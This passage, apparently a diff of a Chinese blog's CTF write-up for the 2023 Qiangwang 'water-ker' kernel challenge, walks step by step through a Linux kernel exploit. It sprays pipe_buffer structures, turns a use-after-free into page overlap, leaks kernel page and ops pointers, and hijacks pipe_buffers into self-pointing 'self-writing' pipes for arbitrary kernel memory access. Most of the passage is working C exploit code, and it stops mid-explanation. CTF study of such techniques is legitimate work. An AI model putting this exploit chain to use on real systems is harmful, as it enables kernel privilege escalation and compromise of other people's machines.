write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用uaf更改pipe_buffer-&gt;page的低字节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] edit one...&quot;</span>);</span><br><span class="line">edit_chunk(<span class="string">&quot;\x80&quot;</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查找是否造成page重叠并确定victim pipe_buffer的序号victim_pid，如果读出的idx和实际的idx不一样则成功</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> a3_str[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(a3_str, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(a3_str));</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], a3_str, <span class="number">8</span>);</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a3_str, <span class="string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i)</span><br><span class="line">    &#123;</span><br><span class="line">        orig_pid = nr;</span><br><span class="line">        victim_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, </span><br><span class="line">               victim_pid, orig_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(victim_pid == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    err_exit(<span class="string">&quot;Fail to find the orig!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h3 id="构造二级自写管道"><a href="#构造二级自写管道" class="headerlink" title="构造二级自写管道"></a>构造二级自写管道</h3><p>上文中我们已经有了页级uaf，现在可以用这个页分配结构体进行泄露和结构体改写了，这里依然选择pipe_buffer作为victim结构体</p>
+<ul>
+<li><p>kmalloc在对应kmem_cache的slab不够用时会向buddy system申请page做为新的slab，申请的page的order由kmem_cache结构体的oo成员的高16位决定</p>
+</li>
+<li><p>所以我们需要新的pipe_buffer数组的大小满足<strong>对应kmem_cache的oo高16位为0</strong>，这样才会将刚才uaf的page取回来作为slab分配，这也就是exp中snd_pipe_sz的计算逻辑，这里选择96的kmem_cache</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="type">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br></pre></td></tr></table></figure></li>
+</ul>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf2.png" class title="uaf2">
+
+<p>此时我们可以通过第一次uaf获取victim pipe_buffer的内容，泄露victim page的地址</p>
+<ul>
+<li><p>然后再在victim page上造一个uaf，再把victim page分配为pipe_buffer数组</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf3.png" class title="uaf3">
+</li>
+<li><p>由于我们已经知道了victim page的地址，可以把victim pipe_buffer2-&gt;page再指回victim page，我改我自己（</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf4.png" class title="uaf4"></li>
+</ul>
+<p>这时就可以修改pipe_buffer的offset和len来控制pipe的读写起始位置（offset是读起始位置，len是写起始位置 - 读起始位置）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>继续exp</p>
+<p>我们需要3个这样的self-pointing pipe_buffer</p>
+<ul>
+<li><p>先向victim pipe里写一些数据不然之后无法读取</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="number">2</span> - <span class="number">40</span> - <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>制造页级uaf，利用fcntl将pipe_buffer分配到uaf页上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line">  </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (i == orig_pid || i == victim_pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>泄露pipe_buffer-&gt;page和pipe_buffer-&gt;ops</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> </span><br><span class="line">       <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, </span><br><span class="line">       info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>((<span class="type">size_t</span>) info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> || (<span class="type">size_t</span>) info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">&#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br></pre></td></tr></table></figure>
+
+<p>解释一下读写数据量的计算，先是read</p>
+<ul>
+<li><p>由于之前已经读取了8+4字节用于判断page重叠是否成功，所以此时offset为12，想要读取在pipe_buffer结构体开始的成员就只能读取下一个slab-96的pipe_buffer</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read1.png" class title="read1">
+</li>
+<li><p>所以要先读取96-8-4字节才能读到第二个slab-96的pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read2.png" class title="read2"></li>
+</ul>
+<p>再解释一下write的数据量计算</p>
+<ul>
+<li><p>由于write的偏移一定在read之后，所以要想更改pipe_buffer只能改第三个slab-96的piipe_buffer（前两个用于read了）</p>
+</li>
+<li><p>之前已经向pipe中写入了8 * 5 + 4 * 2字节，所以要先write这么多👇字节来保证此时write的偏移位于第三个slab-96的pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="number">2</span> - <span class="number">40</span> - <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/write1.png" class title="write1"></li>
+</ul>
+</li>
+<li><p>更改pipe_buffer-&gt;page制造第二个uaf，并确定victim pipe_buffer的序号snd_vicitm_pid</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">info_pipe_buf.page = (<span class="keyword">struct</span> page*)((<span class="type">size_t</span>) info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> a3_str[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(a3_str, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(a3_str));</span><br><span class="line">    <span class="keyword">if</span>(i == orig_pid || i == victim_pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], a3_str, <span class="number">8</span>);</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span>(nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)</span><br><span class="line">    &#123;</span><br><span class="line">        snd_orig_pid = nr;</span><br><span class="line">        snd_vicitm_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, </span><br><span class="line">               snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(snd_vicitm_pid == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/write2.png" class title="write2"></li>
+</ul>
+<p>进入眼花缭乱的阶段(ˉ▽ˉ；)…，building_self_writing_pipe</p>
+<ul>
+<li><p>我们要再次将uaf的page分配为pipe_buffer，这次选择slab-192，逻辑与上次一致</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line">  </span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br></pre></td></tr></table></figure>
+
+<p>这次我们要改写第二个slab-192的pipe_buffer（之前已写入40 + 2 * 4字节）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">40</span> - <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>更改第二个slab-192的pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* let a pipe-&gt;bufs pointing to itself */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">evil_pipe_buf.private = info_pipe_buf.private;</span><br><span class="line">  </span><br><span class="line">write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point.png" class title="slf-point">
+</li>
+<li><p>检查劫持是否成功（根据pipe_buffer-&gt;page），确定第一个self-pointing pipe_buffer序号self_2nd_pipe_pid</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="keyword">if</span>(page_ptr == evil_pipe_buf.page)</span><br><span class="line">    &#123;</span><br><span class="line">        self_2nd_pipe_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, </span><br><span class="line">                self_2nd_pipe_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(self_2nd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获得第二个self-pointing pipe_buffer，确定序号self_3rd_pipe_pid，这时更改的是第三个slab-192的pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* overwrite the 3rd pipe_buffer to this page too */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">  </span><br><span class="line">write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="keyword">if</span>(page_ptr == evil_pipe_buf.page)</span><br><span class="line">    &#123;</span><br><span class="line">        self_3rd_pipe_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                <span class="string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(self_3rd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point1.png" class title="slf-point1">
+</li>
+<li><p>获得第三个self-pointing pipe_buffer，确定序号self_4th_pipe_pid，这时更改的是第四个slab-192的pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* overwrite the 4th pipe_buffer to this page too */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">  </span><br><span class="line">write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="keyword">if</span>(page_ptr == evil_pipe_buf.page)</span><br><span class="line">    &#123;</span><br><span class="line">        self_4th_pipe_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                <span class="string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point2.png" class title="slf-point2">
+</li>
+<li><p>以上过程<strong>大部分pipe</strong>需要读取2次<strong>8字节字符串+4字节序号</strong>，三次<strong>8字节指针</strong>，所以最开始需要这么write👇</p>
